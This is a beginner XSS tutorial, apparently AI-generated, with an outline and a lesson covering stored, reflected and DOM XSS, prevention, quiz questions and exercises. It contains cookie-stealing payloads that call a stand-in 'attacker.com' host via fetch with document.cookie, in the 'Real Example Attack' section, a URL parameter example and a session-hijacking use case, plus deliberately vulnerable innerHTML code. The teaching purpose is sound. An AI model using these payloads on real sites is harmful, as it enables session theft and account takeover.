<!-- # Cross-Site Scripting (XSS)

---

## 1) What is XSS?

Cross-Site Scripting (XSS) is a security vulnerability where an attacker injects malicious JavaScript into a website that runs in other users’ browsers.

---

## 2) Why is XSS dangerous?

It allows attackers to:

* steal cookies/session tokens
* hijack user accounts
* read sensitive data
* modify UI
* redirect users
* perform actions as the user

---

## 3) When does XSS happen?

* unsafe user input handling
* inserting data into DOM without sanitization
* rendering HTML from user input
* using dangerous APIs

---

## 4) Types of XSS

### 1. Stored XSS

* Script saved in database
* Executes for all users

Example:

```html
<div id="comments"></div>

<script>
  const comment = "<script>alert('Hacked')</script>";
  document.getElementById("comments").innerHTML = comment;
</script>
```

---

### 2. Reflected XSS

* Comes from URL or request
* Executes immediately

Example:

```javascript
const query = new URLSearchParams(window.location.search).get("q");
document.body.innerHTML = query;
```

---

### 3. DOM-Based XSS

* Happens in frontend JS only

Example:

```javascript
const hash = window.location.hash;
document.getElementById("app").innerHTML = hash;
```

---

## 5) Dangerous APIs

Avoid unsafe usage of:

```javascript
element.innerHTML
element.outerHTML
document.write()
eval()
setTimeout("code")
setInterval("code")
```

---

## 6) Safe vs Unsafe

### ❌ Unsafe

```javascript
element.innerHTML = userInput;
```

### ✅ Safe

```javascript
element.textContent = userInput;
```

---

## 7) Real Example Attack

```javascript
<script>
  fetch("https://attacker.com/steal?cookie=" + document.cookie);
</script>
```

---

## 8) Prevention Techniques

### 1. Output Encoding

Convert special characters:

```
< → &lt;
> → &gt;
```

---

### 2. Use textContent

```javascript
element.textContent = userInput;
```

---

### 3. Input Validation

Reject suspicious input

---

### 4. Sanitization

Use libraries like DOMPurify

---

### 5. Content Security Policy (CSP)

```http
Content-Security-Policy: script-src 'self'
```

---

### 6. HttpOnly Cookies

```http
Set-Cookie: HttpOnly
```

---

### 7. Avoid Inline JS

❌ Bad:

```html
<button onclick="doSomething()">
```

✅ Good:

```javascript
button.addEventListener("click", doSomething);
```

---

## 9) Key Differences

| Type      | Source | Stored? |
| --------- | ------ | ------- |
| Stored    | DB     | Yes     |
| Reflected | URL    | No      |
| DOM       | JS     | No      |

---

## 10) Common Mistakes

* trusting user input
* using innerHTML blindly
* no sanitization
* storing raw HTML
* ignoring CSP

---

## 11) Interview Definition

XSS is a vulnerability where malicious scripts are injected into trusted web pages and executed in users’ browsers, allowing attackers to steal data or manipulate the application.

---

## 12) Golden Rule

👉 Never trust user input
👉 Always sanitize and encode output

 -->
Perfect — let’s do **Cross-Site Scripting (XSS)** strictly in your **locked “Closures-style Engineering Template”** (deep, structured, interview-ready, beginner → advanced).

---

# 🚨 Cross-Site Scripting (XSS)

---

## 1️⃣ What is XSS?

### ✅ Definition

**Cross-Site Scripting (XSS)** is a security vulnerability where an attacker injects **malicious JavaScript code** into a web application, which then runs in other users’ browsers.

---

## 🧠 Very Simple Meaning

> User input becomes **code instead of data**

---

## Example (Your Code)

```html
<div id="comments"></div>

<script>
  const comment = "<script>alert('Hacked')</script>";
  document.getElementById("comments").innerHTML = comment;
</script>
```

### ❌ What happens?

* Browser treats `<script>` as executable code
* Alert runs → attacker controls behavior

---

## 🚨 Key Idea

> Browser trusts your DOM → attacker abuses that trust

---

## 2️⃣ Why XSS is Dangerous?

### 🎯 Impact

* Steal cookies (session hijacking)
* Access user accounts
* Modify UI (phishing)
* Perform actions on behalf of user
* Inject malware

---

### Real-world Example

```javascript
document.body.innerHTML = query;
```

If URL contains:

```
?q=<script>fetch('https://attacker.com?cookie='+document.cookie)</script>
```

👉 Cookies get stolen silently

---

## 3️⃣ When Does XSS Happen?

XSS happens when:

* User input is directly inserted into DOM
* Input is not sanitized/escaped
* HTML is rendered dynamically

---

## 4️⃣ Where XSS Occurs?

* Comment systems
* Search results
* URL parameters
* Chat apps
* Forms
* Admin dashboards
* CMS editors

---

## 5️⃣ Types of XSS

---

### 🔴 1. Stored XSS (Persistent)

#### What

Malicious script is stored in database

#### Example

```javascript
// Attacker saves comment
"<script>alert('XSS')</script>"
```

#### Impact

* Every user viewing page gets attacked

---

### 🟠 2. Reflected XSS

#### What

Input is reflected immediately in response

#### Example

```javascript
document.body.innerHTML = location.search;
```

---

### 🔵 3. DOM-Based XSS

#### What

Client-side JS injects unsafe data

#### Example

```javascript
document.getElementById("app").innerHTML = userInput;
```

---

## 6️⃣ Real-Life Analogy

### 🏠 Analogy: Visitor Book Attack

* Website = house
* Input field = visitor register
* You allow writing freely
* Attacker writes:

  > “Anyone entering, go to this fake room”

Now every visitor is tricked

👉 That’s XSS

---

## 7️⃣ Engineering View (Very Important)

### 🔥 Root Cause

```text
Untrusted Input → Treated as HTML/JS → Executed by Browser
```

---

### 🔑 Dangerous APIs

* `innerHTML`
* `outerHTML`
* `document.write`
* `eval()`
* `setTimeout(string)`
* `setInterval(string)`

---

### Safe vs Unsafe

| Unsafe    | Safe         |
| --------- | ------------ |
| innerHTML | textContent  |
| eval      | JSON.parse   |
| raw HTML  | escaped HTML |

---

## 8️⃣ How XSS Works Internally

1. Attacker sends malicious input
2. Server/client includes it in HTML
3. Browser parses HTML
4. `<script>` executes
5. Attacker gains access

---

## 9️⃣ Vulnerable vs Secure Code

---

### ❌ Vulnerable

```javascript
const query = new URLSearchParams(window.location.search).get("q");
document.body.innerHTML = query;
```

---

### ✅ Secure

```javascript
const query = new URLSearchParams(window.location.search).get("q");
document.body.textContent = query;
```

---

## 🔥 Difference

| Code        | Behavior        |
| ----------- | --------------- |
| innerHTML   | executes script |
| textContent | treats as text  |

---

## 10️⃣ Real-World Use Cases (Attack Perspective)

---

### 🧾 Use Case 1 — Comment System Attack

* Attacker posts malicious comment
* All users get infected

---

### 🔐 Use Case 2 — Session Hijacking

```javascript
fetch("https://attacker.com?cookie=" + document.cookie);
```

---

### 🪪 Use Case 3 — Fake Login UI

* Replace DOM with phishing form

---

### 📊 Use Case 4 — Admin Panel Attack

* Inject script → steal admin tokens

---

## 11️⃣ Prevention Techniques (MOST IMPORTANT)

---

### ✅ 1. Escape Output

```javascript
element.textContent = userInput;
```

---

### ✅ 2. Input Sanitization

Use libraries like:

* DOMPurify

---

### ✅ 3. Avoid Dangerous APIs

❌ Avoid:

```javascript
innerHTML
eval()
```

---

### ✅ 4. Content Security Policy (CSP)

HTTP Header:

```http
Content-Security-Policy: script-src 'self'
```

---

### ✅ 5. HTTPOnly Cookies

```http
Set-Cookie: session=abc; HttpOnly
```

👉 JS cannot access cookies

---

### ✅ 6. Framework Safety

Frameworks like:

* React
* Angular

👉 auto-escape by default

---

## 12️⃣ Common Mistakes

---

### ❌ Mistake 1

Using `innerHTML` for user input

---

### ❌ Mistake 2

Trusting URL parameters

---

### ❌ Mistake 3

Sanitizing on frontend only

---

### ❌ Mistake 4

Using `eval()`

---

### ❌ Mistake 5

Ignoring CSP

---

## 13️⃣ Deep Concepts

---

### 🔍 1. DOM Parsing Behavior

Browser converts string → DOM → executes scripts

---

### 🔍 2. Execution Context

Injected JS runs in **same origin**

👉 Full access to:

* cookies
* localStorage
* DOM

---

### 🔍 3. Same-Origin Policy Bypass

XSS bypasses browser security because script runs from trusted domain

---

## 14️⃣ MCQs

---

### Questions

1. XSS stands for?
   A. Cross Style Sheets
   B. Cross-Site Scripting
   C. Cross Script Security
   D. Extended Script System

2. Which is unsafe?
   A. textContent
   B. innerHTML
   C. JSON.parse
   D. encodeURIComponent

3. XSS allows attacker to:
   A. style page
   B. steal cookies
   C. compress images
   D. cache data

4. Which type stores payload?
   A. Reflected
   B. Stored
   C. DOM
   D. Async

5. Safe alternative of innerHTML?
   A. eval
   B. textContent
   C. setTimeout
   D. document.write

---

### Answers

1. B
2. B
3. B
4. B
5. B

---

## 15️⃣ Subjective Questions

---

### Questions

1. What is XSS?
2. Types of XSS
3. Why innerHTML is dangerous?
4. How does XSS steal cookies?
5. How to prevent XSS?

---

### Answers

---

**1. What is XSS?**
XSS is a vulnerability where malicious scripts are injected into web pages and executed in user browsers.

---

**2. Types of XSS?**
Stored, Reflected, DOM-based.

---

**3. Why innerHTML is dangerous?**
Because it parses and executes HTML including scripts.

---

**4. How does XSS steal cookies?**
Injected script accesses `document.cookie` and sends it to attacker.

---

**5. How to prevent XSS?**
Escape output, sanitize input, avoid unsafe APIs, use CSP.

---

## 16️⃣ Practical Exercises

---

### 🧪 Exercise 1

Convert this unsafe code:

```javascript
element.innerHTML = userInput;
```

👉 into safe version

---

### 🧪 Exercise 2

Create a safe comment renderer

---

### 🧪 Exercise 3

Simulate attack via URL param

---

## 17️⃣ Mini Projects

---

### 🚀 Project 1 — Secure Comment System

* Store comments
* Sanitize before render

---

### 🚀 Project 2 — Safe Search Page

* Read query param
* Display safely

---

### 🚀 Project 3 — XSS Detector

* Identify dangerous inputs

---

## 18️⃣ Interview Notes

---

### 🔥 One-line Answer

> XSS is a vulnerability where untrusted input is executed as JavaScript in the browser, allowing attackers to steal data or manipulate UI.

---

### 🔥 Key Points

* Caused by unsafe DOM rendering
* Prevent using escaping & CSP
* `innerHTML` is risky
* Same-origin makes it dangerous

---

## 19️⃣ Summary

---

### 💡 Core Idea

```text
User Input → Not Sanitized → Treated as Code → Executed → Attack
```

---

### 🧠 Memory Trick

* **XSS = Input becomes Script**
* **Fix = Treat input as TEXT, not HTML**

---


